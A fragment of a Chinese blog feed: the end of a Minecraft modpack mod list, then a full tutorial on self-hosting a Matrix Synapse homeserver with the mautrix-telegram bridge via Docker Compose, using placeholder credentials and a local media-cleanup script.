个模组依赖此</td></tr><tr><td><strong>MagicLib</strong> <em>0.7.346</em></td><td>特定模组的依赖库</td><td><a href="https://github.com/Hendrix-Shen/MagicLib">Github</a></td><td>MasaGadget 依赖此；依赖 MaLiLib</td></tr><tr><td><strong>libIPN</strong> <em>3.0.2</em></td><td>特定模组的依赖库</td><td><a href="https://github.com/blackd/libIPN">Github</a></td><td>一键背包整理Next 依赖此；依赖 Fabric Language Kotlin</td></tr></tbody></table><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>钠</strong> Sodium <em>0.4.10</em></td><td>极大地提升帧率并修复许多图形问题</td><td><a href="https://github.com/CaffeineMC/sodium-fabric">Github</a></td><td></td></tr><tr><td><strong>锂</strong> Lithium <em>0.11.2</em></td><td>优化各类计算机制</td><td><a href="https://github.com/CaffeineMC/lithium-fabric">Github</a></td><td></td></tr><tr><td><strong>铁氧体磁芯</strong> FerriteCore <em>6.0.0</em></td><td>减少内存占用并牺牲一些帧率</td><td><a href="https://github.com/malte0811/FerriteCore">Github</a></td><td>可能导致帧率不稳定</td></tr><tr><td><strong>氪</strong> Krypton <em>0.2.3</em></td><td>优化网络堆栈</td><td><a href="https://github.com/astei/krypton">Github</a></td><td></td></tr><tr><td><strong>疾速加载</strong> DashLoader <em>5.0.0</em></td><td>缓存内容以大幅度加速游戏启动</td><td><a href="https://github.com/TeamQuantumFusion/DashLoader">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/dashloader">CurseForge</a></td><td></td></tr><tr><td><strong>实体渲染机制优化</strong> Entity Culling Fabric_1.6.2_</td><td>跳过渲染不可见的实体</td><td><a href="https://github.com/tr7zw/EntityCulling">Github</a></td><td>与许多需要渲染大量实体的模组冲突</td></tr><tr><td><strong>动态FPS</strong> Dynamic Fps <em>2.4.0</em></td><td>自动降低游戏窗口在未聚焦时的渲染帧数</td><td><a href="https://github.com/juliand665/Dynamic-FPS">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）；可能使部分 AFK 装置失效</td></tr><tr><td><strong>更好的树叶渲染优化</strong> CullLessLeaves <em>1.2.0</em></td><td>自定义需要渲染的树叶层数</td><td><a href="https://github.com/isXander/CullLessLeaves">Github</a></td><td>在 模组菜单（依赖 YetAnotherConfigLib）或 钠 的视频设置中有可配置选项</td></tr><tr><td><strong>服务器区块缓存</strong> Bobby <em>5.0.0</em></td><td>超越服务器渲染距离限制</td><td><a href="https://github.com/johni0702/bobby">Github</a></td><td></td></tr><tr><td><strong>输入法冲突修复</strong> IMBlocker <em>4.0.2</em></td><td>在输入法开启时根据场景自动处理输入法输入</td><td><a href="https://github.com/reserveword/IMBlocker">Github</a></td><td>不兼容 Linux、MacOS</td></tr><tr><td><strong>方块同步修复</strong> AntiGhost <em>1.1.5</em></td><td>用 &#x2F;ghost 或快捷键快速修复附近的假方块</td><td><a href="https://github.com/gbl/AntiGhost">Github</a></td><td></td></tr><tr><td><strong>禁用聊天举报</strong> No Chat Reports <em>2.2.2</em></td><td>禁用 1.19 中多人游戏新增的聊天举报</td><td><a href="https://github.com/Aizistral-Studios/No-Chat-Reports">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/no-chat-reports">CurseForge</a></td><td></td></tr></tbody></table><h3 id="资源包-1"><a href="#资源包-1" class="headerlink" title="资源包"></a>资源包</h3><h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Fast Better Grass</strong> <em>1</em></td><td>类似 Optfine，草方块侧面也有草</td><td></td><td></td></tr><tr><td><strong>RTX 16x</strong> <em>v6</em></td><td>仿基岩版 RTX PBR 法线材质，可搭配光影实现光追</td><td><a href="https://www.curseforge.com/minecraft/texture-packs/rtx-16x-for-java">CurseForge</a></td><td></td></tr></tbody></table><h4 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>汉化游戏文本+</strong> <em>3687ee6</em></td><td>汉化闪烁标语、终末之诗等，并添加了许多闪烁标语</td><td><a href="https://github.com/jiesou/Minecraft-Text-Sinicization/tree/plus">Github</a></td><td></td></tr><tr><td><strong>Xaeros 地图汉化</strong> <em>210826</em></td><td>汉化 Xaeros 地图系列</td><td><a href="https://www.bilibili.com/read/cv19539687">哔哩哔哩</a></td><td>新兵Sinbing 制作</td></tr></tbody></table><h3 id="光影-1"><a href="#光影-1" class="headerlink" title="光影"></a>光影</h3><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Make Up - Ultra Fast</strong> <em>8.8e</em></td><td>超低配光影</td><td><a href="https://www.sonicether.com/seus">官网</a></td><td>配置要求 低 - 高</td></tr><tr><td><strong>Complementary Reimagined</strong> <em>r2.2.1</em></td><td>Complementary Shaders 重制版，贴近原版风格</td><td>配置要求 低 - 中高；汉化 by Surisen</td><td></td></tr><tr><td><strong>Complementary Shaders</strong> <em>v4.7.2</em></td><td>魔改自 BSL 的全能光影</td><td><a href="https://www.complementary.dev/">官网</a> <a href="https://www.curseforge.com/minecraft/customization/complementary-shaders">CurseForge</a></td><td>配置要求 中低 - 中高；汉化 by 小小的宇宇</td></tr><tr><td><strong>Rethinking Voxels</strong> <em>r0.1_alpha4</em></td><td>基于 Complementary Reimagined，体素化光照，近似光追</td><td>配置要求 中高 - 极高；汉化 by</td><td></td></tr><tr><td>Surisen</td><td></td><td></td><td></td></tr></tbody></table><h2 id="选装模组"><a href="#选装模组" class="headerlink" title="选装模组"></a>选装模组</h2><p>本整合包已尽量使每个实用模组都能同时运行，然而，仍有许多实用模组不相兼容。以下模组可根据需要取舍选装：</p><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>ViaFabricPlus</strong> <em>2.7.8</em></td><td>使客户端可连接的服务器向下兼容</td><td><a href="https://github.com/ViaVersion/ViaFabricPlus">Github</a></td><td>可能触发部分反作弊，不兼容 氪</td></tr><tr><td><strong>回放</strong> Replay Mod <em>2.6.8</em></td><td>录制游戏内容并可编辑、渲染</td><td><a href="https://www.replaymod.com/">官网</a> <a href="https://github.com/ReplayMod/ReplayMod">Github</a></td><td>不兼容 钠</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>一些日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>Minecraft</tag>
      
      <tag>游戏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>别再用 Telegram 了！快换到真开源的 Martix — 搭建 mautrix-telegram 桥接</title>
    <link href="/archives/2a3d3c6c/"/>
    <url>/archives/2a3d3c6c/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>比起微信 QQ 那种毒瘤，Telegram 已是降维打击。然而现在 Telegram 也正变得越来越封闭，加入了频道广告还有 Telegram Premium，对免费用户的限制越来越多</p><p>最关键的是 Telegram 的开源开放程度也在一点点地降低，而且 Telegram 本身的端到端加密对话没法云同步，群聊频道都不支持，根本没想让你日常使用。Telegram 的服务器端并不开源，从<em>技术上来说</em> Telegram 对用户的消息是有<strong>完全掌控权</strong>的，他们想干嘛都可以，与微信 QQ 没有本质区别</p><p>更何况 Telegram 客户端的开源程度有一点点的在降低，对三方客户端的限制越来越多。包括不能注册、限速下载以及严格的风控</p><p>这也正导致一些主打去中心化、开源开放的即时通讯软件&#x2F;协议越来越活跃起来。Matrix 就是相对知名且功能完善的</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://matrix.org/">Matrix</a> 本身只是一种去中心化的通讯协议，逻辑类似电子邮箱</p><p>电子邮箱中你可以选择不同的服务商：Gmail、QQ邮箱，而在 Matrix 中你也可以选不同的 Homeserver。比如一个形似 <code>@chen_this:matrix.org</code> 的用户名中，<code>:</code> 后的域名就表示这个用户所属的 Homeserver</p><p>就像电子邮箱中一样，<strong>不同 Homeserver</strong> 之间的消息也可以<strong>互通</strong>，而且每个 Homeserver 提供商都可以设置自己的规则，管理自己的用户。即使某个 Homeserver 宕机了，使用其他 Homeserver 的人也不会受到影响。而且协议本身也没法被墙之类的</p><p>同样，就像电子邮箱本身只是个协议，需要一个客户端，使用 Matrix 也<strong>要一个客户端</strong>。现在最为流行的就是 <a href="https://element.io/">Element</a>（以前叫 Riot.im）。下载安装直接注册即可，注册 Matrix 账户不用手机号，通常需要电子邮箱，取决于 Homeserver 的设置</p><p>Matrix 对群聊对话的数量限制几乎没有，消息都是云同步，能发送贴纸表情、各种媒体，什么投票定位权限管理一应俱全。美中不足的是大多数 Homeserver 都只允许你上传单个最大 100M&#x2F;200M 的文件</p><h2 id="桥接"><a href="#桥接" class="headerlink" title="桥接"></a>桥接</h2><p>Matrix 还有一个特性就是能与其他即时通讯软件桥接。就像 Telegram 有 EH Forwarder Bot。然而 Telegram 的 EFB 确实问题挺多，经常动不动离线</p><p>Matrix 的各种 Bridges 能让你和 Telegram、Discord 甚至微信 QQ 桥接，直接在 Matrix 上收发其他平台的消息，而且体验相当无缝。这篇文章主要讲的就是 <a href="https://github.com/mautrix/telegram">mautrix-telegram</a>，支持 Matrix - Telegram 双向映射，当然主要是 Telegram to Matrix</p><h3 id="预备条件"><a href="#预备条件" class="headerlink" title="预备条件"></a>预备条件</h3><ul><li>服务器</li><li>域名</li><li>域名的 SSL 证书</li></ul><p>不同于 Telegram 可以直接调用 Core API，由于 Matrix 的去中心化，要想在 Matrix 上和别人收发消息，你还<strong>需要搭建自己的 Homeserver</strong></p><p>当然 Homeserver 也可以在 Docker 中运行，但要搭建它你还需要一个域名。最好是二级域名而不是三级或以上（example.com 而不是 matrix.example.com）</p><p>还需要有这个域名的 SSL 证书，<a href="https://certbot.eff.org/">certbot</a> 申请的 Let’s Encrypt 即可。安装 certbot 后运行 <code>sudo certbot certonly --standalone</code> 并根据说明操作</p><h3 id="Docker-Compose-部署"><a href="#Docker-Compose-部署" class="headerlink" title="Docker Compose 部署"></a>Docker Compose 部署</h3><p>整个桥以及配套环境都建议使用 <a href="https://docs.docker.com/compose/">Docker Compose</a> 部署，一条命令就能开关，容器与外界隔离，不用担心依赖、兼容问题</p><h4 id="大体流程"><a href="#大体流程" class="headerlink" title="大体流程"></a>大体流程</h4><p>以下是我根据官方配置自己写的 docker-compose.yaml，把需要的服务都揉到了一起，供参考：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">synapse:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">docker.io/matrixdotorg/synapse:latest</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">SYNAPSE_CONFIG_PATH=/data/homeserver.yaml</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./synapse:/data</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/letsencrypt:/etc/cert:ro</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">8448</span><span class="hljs-string">:8448/tcp</span><br><br>  <span class="hljs-attr">mautrix-telegram:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">dock.mau.dev/mautrix/telegram:latest</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./mautrix-telegram:/data</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>  <br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">docker.io/postgres:12-alpine</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=matrix</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=changeme</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_INITDB_ARGS=--encoding=UTF-8</span> <span class="hljs-string">--lc-collate=C</span> <span class="hljs-string">--lc-ctype=C</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./schemas:/var/lib/postgresql/data</span><br></code></pre></td></tr></table></figure><ol><li>在需要的位置<code>mkdir matrix-service</code> 创建文件夹然后进入</li><li>在文件夹中创建 <code>docker-compose.yaml</code> 文件，粘贴以上配置，修改 POSTGRES_PASSWORD</li><li><code>docker compose up</code> 首次运行生成配置文件</li><li>调整配置后 <code>docker compose up -d</code> 持续运行</li></ol><p>以下一点点解释</p><h4 id="Homeserver-Synapse"><a href="#Homeserver-Synapse" class="headerlink" title="Homeserver - Synapse"></a>Homeserver - Synapse</h4><p>Matrix 使用最广泛的 Homeserver 实现就是 <a href="https://github.com/matrix-org/synapse">Synapse</a>，<a href="https://github.com/matrix-org/synapse/blob/develop/contrib/docker/docker-compose.yml">官方提供 docker-compose.yaml</a></p><p>虽然 Synapse 也支持 SQLite，但建议无论如何都要使用 PostgreSQL。这不会笨重多少，而 SQLite 后期维护起来会相当麻烦，性能也很差</p><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>首次运行生成配置文件后，进入 <code>./synapse</code> 目录即可看到 <code>homeserver.yaml</code>。<a href="https://matrix-org.github.io/synapse/latest/usage/configuration/config_documentation.html">配置文件文档</a></p><p>要添加&#x2F;修改的有这么几个</p><h6 id="server-name"><a href="#server-name" class="headerlink" title="server_name"></a>server_name</h6><p>直接填写你的 Homeserver 域名</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server_name:</span> <span class="hljs-string">&quot;example.com&quot;</span><br></code></pre></td></tr></table></figure><h6 id="listeners"><a href="#listeners" class="headerlink" title="listeners"></a>listeners</h6><p>填写监听端口</p><p>8448 对外开放，已在 docker-compose.yaml 中配置端口映射，如果云服务器有<strong>防火墙也要允许</strong>。其中 tls: true 需要 SSL 证书</p><p>8008 仅用于和 mautrix-telegram 桥的容器内网沟通，不必启用 tls</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">listeners:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">8448</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">http</span><br>    <span class="hljs-attr">tls:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">resources:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-attr">names:</span> [<span class="hljs-string">client</span>, <span class="hljs-string">federation</span>]<br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">8008</span><br>    <span class="hljs-attr">tls:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">http</span><br>    <span class="hljs-attr">x_forwarded:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">resources:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">names:</span> [<span class="hljs-string">client</span>, <span class="hljs-string">federation</span>]<br>        <span class="hljs-attr">compress:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>要启用 tls，需要在配置文件中配置证书的位置</p><p>certbot 申请的证书默认放在 &#x2F;etc&#x2F;letsencrypt。docker-compose.yaml 中已将 &#x2F;etc&#x2F;letsencrypt 映射到容器内的 &#x2F;etc&#x2F;cert</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">tls_certificate_path:</span> <span class="hljs-string">&quot;/etc/cert/live/example.com/fullchain.pem&quot;</span><br><span class="hljs-attr">tls_private_key_path:</span> <span class="hljs-string">&quot;/etc/cert/live/example.com/privkey.pem&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>&#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;example.com 路径中的证书文件实际上是对 &#x2F;etc&#x2F;letsencrypt&#x2F;archive 的软链接。所以必须将整个 &#x2F;etc&#x2F;letsencrypt 映射过去，而不能只映射单个域名</p></blockquote><h6 id="database"><a href="#database" class="headerlink" title="database"></a>database</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">database:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">psycopg2</span><br>  <span class="hljs-attr">args:</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">matrix</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-string">changeme</span><br>    <span class="hljs-attr">database:</span> <span class="hljs-string">synapse</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-string">db</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">5432</span><br>    <span class="hljs-attr">cp_min:</span> <span class="hljs-number">5</span><br>    <span class="hljs-attr">cp_max:</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>配置连接到 PostgreSQL 的信息</p><p>密码需要与 docker-compose.yaml 中 POSTGRES_PASSWORD 相同</p><p>一般来讲，database <code>synapse</code> 不会被自动创建，可以在编辑好配置后统一创建</p><h6 id="app-service-config-files"><a href="#app-service-config-files" class="headerlink" title="app_service_config_files"></a>app_service_config_files</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">app_service_config_files:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">/data/mautrix-telegram-registration.yaml</span><br></code></pre></td></tr></table></figure><p>用来管理 app_service。各种桥接程序都属于 app_service，需要在这里注册配置，说明自己需要的用户名和管理权限等。例如 mautrix-telegram 默认 bot 用户名是 @telegrambot:example.com，需要 @**telegram:example.com 的用户名</p><p>首次运行 mautrix-telegram 后会在 <code>./mautrix-telegram</code> 目录中生成 registration.yaml，需要将它<strong>复制</strong>到此处</p><blockquote><p>修改 mautrix-telegram 的配置后，registration.yaml 可能会发生变化。建议先修改其配置再复制注册文件</p></blockquote><blockquote><p>注册文件只能复制，移动会被重新生成</p></blockquote><h4 id="Bridge-mautrix-telegram"><a href="#Bridge-mautrix-telegram" class="headerlink" title="Bridge - mautrix-telegram"></a>Bridge - mautrix-telegram</h4><p><a href="https://docs.mau.fi/bridges/general/docker-setup.html?bridge=telegram">官方部署文档</a></p><p>同样也支持 SQLite，但建议 PostgreSQL</p><p>首次运行会生成 config.yaml，再次运行生成 registration.yaml</p><h5 id="配置文件-1"><a href="#配置文件-1" class="headerlink" title="配置文件"></a>配置文件</h5><p>能改的东西非常多，要注意的有这么几个，其他的根据喜好改即可</p><h6 id="homeserver"><a href="#homeserver" class="headerlink" title="homeserver"></a>homeserver</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">homeserver:</span><br>    <span class="hljs-attr">address:</span> <span class="hljs-string">http://synapse:8008</span><br>    <span class="hljs-attr">domain:</span> <span class="hljs-string">example.com</span><br></code></pre></td></tr></table></figure><p>其中 <a href="http://synapse/">http://synapse</a> 这类 URL 是 Docker 容器间内网通讯的方式，放在一个 Docker Compose 中的容器可以直接这么通讯</p><p>domain 直接填 Homeserver 的域名即可，没有改过端口就保持默认</p><h6 id="appservice"><a href="#appservice" class="headerlink" title="appservice"></a>appservice</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">appservice:</span><br>     <span class="hljs-attr">address:</span> <span class="hljs-string">http://mautrix-telegram:29317</span><br>     <span class="hljs-attr">database:</span> <span class="hljs-string">postgres://matrix:changeme@db/mautrix_telegram</span><br></code></pre></td></tr></table></figure><p>address 会用于生成 registration.yaml</p><p>database 部分参考 <a href="#database">Synapse 的 database 配置</a>。是 URI 形式。注意 dbname 不支持中划线，所以是 <code>mautrix_telegram</code> 而不是 <code>mautrix-telegram</code></p><h6 id="telegram"><a href="#telegram" class="headerlink" title="telegram"></a>telegram</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">telegram:</span><br>    <span class="hljs-attr">api_id:</span> <span class="hljs-number">12345</span><br>    <span class="hljs-attr">api_hash:</span> <span class="hljs-string">abcd</span><br>    <span class="hljs-attr">bot_token:</span> <span class="hljs-number">1234</span><span class="hljs-string">:abcd</span><br></code></pre></td></tr></table></figure><p>从 <a href="https://my.telegram.org/apps">https://my.telegram.org/apps</a> 获取 api_id 和 api_hash</p><p>bot_token 用于将陌生 Matrix 用户的消息通过 relay bot 转发到 Telegram 实现双向映射，如果只是个人使用<strong>可以不用填写</strong>。可以从 <a href="https://t.me/BotFather">https://t.me/BotFather</a> 中申请一个 bot，获取 bot_token</p><h4 id="数据库初始化"><a href="#数据库初始化" class="headerlink" title="数据库初始化"></a>数据库初始化</h4><p>如<a href="#database">前文</a>所言，首次运行时通常不会在 PostgreSQL 中自动创建 database，但我们可以手动进入其实例来创建</p><h5 id="1-进入实例环境"><a href="#1-进入实例环境" class="headerlink" title="1. 进入实例环境"></a>1. 进入实例环境</h5><p>先确保 docker compose 正在运行，使用 <code>docker ps</code> 来检查正在运行的容器</p><p>这个 Docker Compose 中，PostgreSQL 的容器名通常为 <code>matrix-service-db-1</code>（取决于你的命名）</p><p>然后根据容器名运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it matrix-service-db-1 bash<br></code></pre></td></tr></table></figure><p>进入实例环境</p><h5 id="2-创建-database"><a href="#2-创建-database" class="headerlink" title="2. 创建 database"></a>2. 创建 database</h5><p>在实例环境中运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">psql -U matrix<br></code></pre></td></tr></table></figure><p>进入 PostgreSQL 命令行。-U 取决于 PostgreSQL 的用户名，我的 docker-compose.yaml 默认即 matrix</p><p>然后运行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE synapse;<br><span class="hljs-keyword">CREATE</span> DATABASE mautrix_telegram;<br></code></pre></td></tr></table></figure><p>创建数据库</p><p>可以运行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> datname <span class="hljs-keyword">FROM</span> pg_database;<br></code></pre></td></tr></table></figure><p>来检查有没有正确创建</p><h5 id="3-完成"><a href="#3-完成" class="headerlink" title="3. 完成"></a>3. 完成</h5><p>依次输入 <code>\q</code> <code>exit</code> <code>exit</code> 来退出</p><h4 id="之后可做的"><a href="#之后可做的" class="headerlink" title="之后可做的"></a>之后可做的</h4><p>配置完一切之后运行 <code>docker compose up -d</code> 来持续运行，-d 用于断开与会话的连接（在后台运行）</p><p>使用 <code>docker compose logs --tails 20</code> 来检查它有没有正常运行，–tails 20 用来限制输出的长度</p><p>然后打开你的 Matrix 客户端，例如 Element。根据你的 Homeserver 域名搜索 <code>@telegrambot:example.com</code>，bot 应该会发送一条欢迎消息</p><p><em>Hello, I’m a Telegram bridge bot.<br>Use <code>help</code> for help or <code>login</code> to log in.</em></p><p>恭喜你成功部署 mautrix-telegram 🎉</p><p>telegrambot 的使用可以参考<a href="https://docs.mau.fi/bridges/python/telegram/authentication.html">文档</a></p><h4 id="在自己的-Homeserver-上注册用户"><a href="#在自己的-Homeserver-上注册用户" class="headerlink" title="在自己的 Homeserver 上注册用户"></a>在自己的 Homeserver 上注册用户</h4><p>你可以在自己的 Homeserver 上创建一个管理用户，可以像 matrix.org 一样和其他用户收发消息。也可以管理 Homeserver。参考<a href="https://matrix-org.github.io/synapse/latest/setup/installation.html#registering-a-user">文档</a></p><p>根据容器名运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it matrix-service-synapse-1 register_new_matrix_user<br></code></pre></td></tr></table></figure><p>即可在容器中执行注册，根据说明操作即可</p><p>注册后同样通过客户端来登录，然后在客户端当中获取访问令牌，管理用户可以通过访问令牌来访问 <a href="https://matrix-org.github.io/synapse/latest/usage/administration/admin_api/index.html">Admin API</a></p><h4 id="配置定时清理脚本"><a href="#配置定时清理脚本" class="headerlink" title="配置定时清理脚本"></a>配置定时清理脚本</h4><p>Matrix Homeserver 会承载用户发送的所有聊天记录、媒体文件，尤其是 .&#x2F;synapse&#x2F;media_store 没过几天就会占几十 G。Synapse 提供一个 Admin API 可以删除管理这些媒体。<a href="https://matrix-org.github.io/synapse/latest/admin_api/media_admin_api.html">参考文档</a></p><p>媒体分本地和远程媒体。远程媒体是指在其他 Homeserver 上也存在这些媒体，可以直接删。本地媒体如果删了就没了</p><p>我定时执行这串命令来清理过时媒体</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">auth_token=&quot;syt_admin_auth_token&quot;<br>api_endpoint=&quot;http://localhost:8008/_synapse/admin/v1&quot;<br>before_ts=$(date -d &#x27;12 hours ago&#x27; +%s000)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">delete old <span class="hljs-built_in">local</span> media</span><br>docker exec matrix-service-synapse-1 \<br>  curl --header &quot;Authorization: Bearer $auth_token&quot; \<br>  -X POST &quot;$api_endpoint/media/delete?before_ts=$before_ts&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">delete old remote media</span><br>docker exec matrix-service-synapse-1 \<br>  curl --header &quot;Authorization: Bearer $auth_token&quot; \<br>  -X POST &quot;$api_endpoint/purge_media_cache?before_ts=$before_ts&quot;<br></code></pre></td></tr></table></figure><p>需要注意的是，只能使用官方的 API 或者一些专用清理工具来清理。无论如何你都尽量<strong>不要删除数据库</strong>，除非你真的再也不想用了</p><p>由于 Matrix 的去中心化，即使你将本地数据库删了，在其他 Homeserver 上仍然会存在很多信息。你的数据库和其他的对不上，就会导致更多问题。通常你要把其他 Homeserver 上存在的会话记录也一并删掉才行。参考<a href="https://matrix-org.github.io/synapse/latest/usage/administration/admin_faq.html#i-have-a-problem-with-my-server-can-i-just-delete-my-database-and-start-again">文档</a></p>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>Telegram</tag>
      
      <tag>Web3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加密货币交易 - 你要知道的一切</title>
    <link href="/archives/9cfeac56/"/>
    <url>/archives/9cfeac56/</url>
    
